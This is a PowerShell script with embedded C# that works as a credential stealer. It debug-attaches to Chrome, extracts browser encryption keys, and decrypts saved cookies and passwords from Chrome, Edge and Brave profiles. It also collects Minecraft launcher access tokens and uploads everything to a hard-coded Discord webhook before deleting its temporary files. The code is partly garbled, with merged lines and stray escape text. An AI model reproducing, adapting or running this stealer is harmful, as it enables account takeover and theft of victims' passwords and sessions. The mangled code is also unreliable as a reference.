$ErrorActionPreference = 'SilentlyContinue'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
Add-Type -AssemblyName System.Security.Cryptography -ErrorAction SilentlyContinue

# 1. Inline C# v20 Key Extractor (Stealth Attach)
$csharpSource = @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

public class V20Extractor {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DebugActiveProcess(uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DebugActiveProcessStop(uint dwProcessId);

    public static void ExtractKey() {
        uint targetPid = 0;
        while (true) {
            Process[] chromeProcs = Process.GetProcessesByName("chrome");
            if (chromeProcs.Length > 0) {
                targetPid = (uint)chromeProcs[0].Id;
                break;
            }
            Thread.Sleep(3000);
        }

        if (!DebugActiveProcess(targetPid)) return;

        Thread.Sleep(2000);
        DebugActiveProcessStop(targetPid);
    }
}
'@

try {
    Add-Type -TypeDefinition $csharpSource -ErrorAction Stop
    [V20Extractor]::ExtractKey()
} catch {}

$webhook = 'https://discord.com/api/webhooks/1558746263233499278/eygZvT332CTHEX0uGuNyV7GHbbWuAHFRqzNKTRH7gfRGEimasXIk3t-l8JsF1pw2LHm0'

function RBv([byte[]]$b, [int]$o, [int]$n) {
    switch ($n) {
        1 { return $b[$o] }
        2 { return [BitConverter]::ToUInt16($b,$o) }
        default { return [BitConverter]::ToUInt32($b,$o) }
    }
}

function VI([byte[]]$b, [ref]$o) {
    [uint64]$v = 0; $s = 0
    while ($o.Value -lt $b.Length) {$c = $b[$o.Value]
        $o.Value++$v = $v -bor ([uint64]($c -band 0x7F) -shl $s)$s += 7
        if (($c -band 0x80) -eq 0) { break }
    }
    return $v
}

function ReadDB([string]$path, [string]$table) {
    try {
        if (-not (Test-Path $path)) { return @() }
        $fs = [IO.File]::Open($path, 'Open', 'Read', 'ReadWrite')
        $len =$fs.Length
        $ba = New-Object byte[]$len
        [void]$fs.Read($ba, 0, $len);$fs.Close()

        if ($ba[0] -ne 0x53 -or$ba[1] -ne 0x51 -or $ba[2] -ne 0x4C -or$ba[3] -ne 0x69) { return @() }

        $ps = RBv$ba 16 2
        if ($ps -eq 1) {$ps = 65536 }
        $masterRoot = RBv$ba 0 4
        if ($masterRoot -lt 1) {$masterRoot = 1 }

        $leafCells = New-Object System.Collections.Generic.List[object]
        $visited = @{};$q = New-Object System.Collections.Generic.Queue[uint32]
        $q.Enqueue([uint32]$masterRoot)

        while ($q.Count -gt 0) {
            $pg =$q.Dequeue()
            if ($visited.ContainsKey($pg)) { continue }
            $visited[$pg] = $true; $po = ($pg - 1) *$ps
            if ($po +$ps -gt $len) { continue }$typ = $ba[$po]

            if ($typ -eq 5) {$n = RBv $ba ($po + 3) 2
                for ($i = 0; $i -lt $n; $i++) {
                    $p = RBv$ba ($po + 12 + ($i * 2)) 2
                    $q.Enqueue([uint32]$p)
                }
            } elseif ($typ -eq 13) {$n = RBv $ba ($po + 3) 2
                for ($i = 0; $i -lt $n; $i++) {
                    $co = RBv$ba ($po + 8 + ($i * 2)) 2
                    if ($co -eq 0) { continue }$pp = $po +$co
                    $plen = VI$ba ([ref]$pp)$rid = VI $ba ([ref]$pp)
                    if ($plen -le 0 -or$pp + $plen -gt$len) { continue }
                    $payload = New-Object byte[]$plen
                    [Array]::Copy($ba, $pp,$payload, 0, $plen)$leafCells.Add([pscustomobject]@{ RID = $rid; Payload =$payload })
                }
            }
        }

        $out = New-Object System.Collections.Generic.List[object]
        foreach ($cell in$leafCells) {
            try {
                $rec =$cell.Payload
                $rp = 0; $hl = VI $rec ([ref]$rp)
                $nr = VI$rec ([ref]$rp);$hdrEnd = $rp$starts = New-Object System.Collections.Generic.List[int]
                for ($i = 0; $i -lt$nr; $i++) {$s = VI $rec ([ref]$rp)
                    $starts.Add($s)
                }
                $starts.Add($hl)$cols = New-Object System.Collections.Generic.List[object]
                for ($i = 0; $i -lt$nr; $i++) {$a = $starts[$i]
                    $b2 =$starts[$i + 1]$cval = New-Object byte[] ($b2 -$a)
                    [Array]::Copy($rec, ($hdrEnd + $a),$cval, 0, ($b2 -$a))
                    $cols.Add($cval)
                }

                if ($table -eq 'cookies' -and$cols.Count -ge 7) {
                    $h = [Text.Encoding]::UTF8.GetString($cols[1]).Trim([char]0)
                    $n = [Text.Encoding]::UTF8.GetString($cols[2]).Trim([char]0)
                    $ev =$cols[6]
                    if ($h) { $out.Add([pscustomobject]@{ Host =$h; Name = $n; Enc =$ev }) }
                } elseif ($table -eq 'logins' -and $cols.Count -ge 5) {$u = [Text.Encoding]::UTF8.GetString($cols[1]).Trim([char]0)$un = [Text.Encoding]::UTF8.GetString($cols[3]).Trim([char]0)$pv = if ($cols.Count -ge 6) {$cols[5] } else { New-Object byte[] 0 }
                    if ($u -and$un) { $out.Add([pscustomobject]@{ URL =$u; User = $un; Enc =$pv }) }
                }
            } catch {}
        }
        return $out
    } catch {
        return @()
    }
}

function AesDec([byte[]]$nonce, [byte[]]$ct, [byte[]]$tag, [byte[]]$key) {
    $aes = [Security.Cryptography.AesGcm]::new($key)
    $pt = New-Object byte[]$ct.Length
    $aes.Decrypt($nonce,$ct, $tag,$pt)
    return $pt
}

function DEC([byte[]]$blob, [byte[]]$key) {
    if (!$blob -or$blob.Length -lt 31) { return '' }
    if (!$key) { return [Text.Encoding]::UTF8.GetString($blob) }
    try {
        $nonce = $blob[3..14]$tag = $blob[($blob.Length - 16)..($blob.Length - 1)]$ct = $blob[15..($blob.Length - 17)]
        return [Text.Encoding]::UTF8.GetString((AesDec $nonce$ct $tag$key))
    } catch {
        return [Text.Encoding]::UTF8.GetString($blob)
    }
}

function GLK([string]$lsPath) {
    if (-not (Test-Path $lsPath)) { return$null }
    try {
        $lj = Get-Content$lsPath -Raw | ConvertFrom-Json
        $ekB64 =$lj.os_crypt.encrypted_key
        if (-not $ekB64) { return $null }$ek = [Convert]::FromBase64String($ekB64)$ek = $ek[5..($ek.Length - 1)]
        return [Security.Cryptography.ProtectedData]::Unprotect($ek,$null, 'CurrentUser')
    } catch {
        return $null
    }
}

$appKey =$null
$kBinPath = Join-Path$env:TEMP 'k.bin'
if (Test-Path $kBinPath) {
    try { $appKey = [System.IO.File]::ReadAllBytes($kBinPath); } catch {}
}

$browsers = @{
    'Chrome' = @{ R = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
    'Edge'   = @{ R = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
    'Brave'  = @{ R = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
}

$t = Join-Path$env:TEMP ([guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $t -Force | Out-Null
$CK = New-Object System.Collections.Generic.List[string]$PW = New-Object System.Collections.Generic.List[string]

foreach ($bn in $browsers.Keys) {$root = $browsers[$bn].R
    if (!(Test-Path $root)) { continue }
    $ls = Join-Path$root 'Local State'
    $legacyKey = GLK$ls
    
    $profs = Get-ChildItem$root -Directory | Where-Object { $_.Name -eq 'Default' -or$_.Name -like 'Profile *' }
    foreach ($p in$profs) {
        $cn = Join-Path$p.FullName 'Network\Cookies'
        if (Test-Path $cn) {
            $cd = Join-Path$t ('a' + [guid]::NewGuid().ToString('N').Substring(0, 6) + '.db')
            try {
                [IO.File]::Copy($cn, $cd,$true)
                $rows = ReadDB$cd 'cookies'
                foreach ($r in $rows) {$pt = DEC $r.Enc $legacyKey
                    if (!$pt) { $pt = DEC$r.Enc $appKey }$CK.Add("host=$($r.Host) name=$($r.Name) src=$bn/$($p.Name) val=$pt")
                }
            } catch {}
        }
        
        $ld = Join-Path$p.FullName 'Login Data'
        if (Test-Path $ld) {
            $lcd = Join-Path$t ('b' + [guid]::NewGuid().ToString('N').Substring(0, 6) + '.db')
            try {
                [IO.File]::Copy($ld, $lcd,$true)
                $rows = ReadDB$lcd 'logins'
                foreach ($r in $rows) {$pt = DEC $r.Enc $legacyKey
                    if (!$pt) { $pt = DEC$r.Enc $appKey }$PW.Add("url=$($r.URL) user=$($r.User) src=$bn/$($p.Name) pass=$pt")
                }
            } catch {}
        }
    }
}

$MC = New-Object System.Collections.Generic.List[string]
$mp = Join-Path$env:APPDATA '.minecraft\launcher_accounts.json'
if (Test-Path $mp) {
    try {
        $mj = Get-Content$mp -Raw | ConvertFrom-Json
        foreach ($a in $mj.accounts.PSObject.Properties.Value) {$MC.Add("user=$($a.minecraftProfile.name) uuid=$($a.minecraftProfile.id) token=$($a.accessToken)")
        }
    } catch {}
}

$hn = $COMPUTERNAME; $ts = Get-Date -Format 'yMd-Hm'
$f1 = Join-Path$t 'cookies.txt'; $f2 = Join-Path$t 'passwords.txt'; $f3 = Join-Path$t 'minecraft.txt'
$CK \vert{} Set-Content$f1 -Encoding UTF8
$PW \vert{} Set-Content$f2 -Encoding UTF8
$MC \vert{} Set-Content$f3 -Encoding UTF8

$filesToSend = @($f1, $f2,$f3) | Where-Object { (Test-Path $_) -and (Get-Item$_).Length -gt 0 }
if ($filesToSend.Count -gt 0) {
    $boundary = [guid]::NewGuid().ToString();$LF = "`r`n"
    $ms = New-Object System.IO.MemoryStream
    $enc = [Text.Encoding]::UTF8; $attachments = New-Object System.Collections.Generic.List[object]
    for ($i = 0; $i -lt $filesToSend.Count; $i++) {
        $attachments.Add([ordered]@{ id = [string]$i; filename = (Split-Path $filesToSend[$i] -Leaf) })
    }
    
    $embed = @{ title = "$hn $ts"; color = 3447003; fields = @(@{ name = 'Cookies'; value = "$($CK.Count)"; inline = $true }, @{ name = 'Passwords'; value = "$($PW.Count)"; inline = $true }, @{ name = 'Minecraft'; value = "$($MC.Count)"; inline = $true }) }
    $payloadJson = @{ content = ""; embeds = @($embed); attachments = $attachments } \vert{} ConvertTo-Json -Depth 6 -Compress$p1 = "--$boundary$LF" + "Content-Disposition: form-data; name=`"payload_json`"$LF" + "Content-Type: application/json$LF$LF" + "$payloadJson$LF"
    $bb =$enc.GetBytes($p1);$ms.Write($bb, 0,$bb.Length)
    
    for ($i = 0; $i -lt $filesToSend.Count; $i++) {
        $f =$filesToSend[$i];$fname = Split-Path $f -Leaf$p2 = "--$boundary$LF" + "Content-Disposition: form-data; name=`"files[$i]`"; filename=`"$fname`"$LF" + "Content-Type: text/plain$LF$LF"
        $bb = $enc.GetBytes($p2); $ms.Write($bb, 0, $bb.Length)$bytes = [IO.File]::ReadAllBytes($f);$ms.Write($bytes, 0,$bytes.Length)
        $bb =$enc.GetBytes($LF);$ms.Write($bb, 0,$bb.Length)
    }
    $p3 = "--$boundary--$LF"
    $bb =$enc.GetBytes($p3);$ms.Write($bb, 0,$bb.Length)
    
    try {
        $req = [Net.HttpWebRequest]::Create($webhook)$req.Method = 'POST'
        $req.ContentType = "multipart/form-data; boundary=$boundary"
        $req.ContentLength =$ms.Length
        $rs =$req.GetRequestStream()
        $rs.Write($ms.ToArray(), 0, $ms.Length);$rs.Close()
        [void]$req.GetResponse()
    } catch {}
}

Remove-Item $t -Recurse -Force -ErrorAction SilentlyContinue
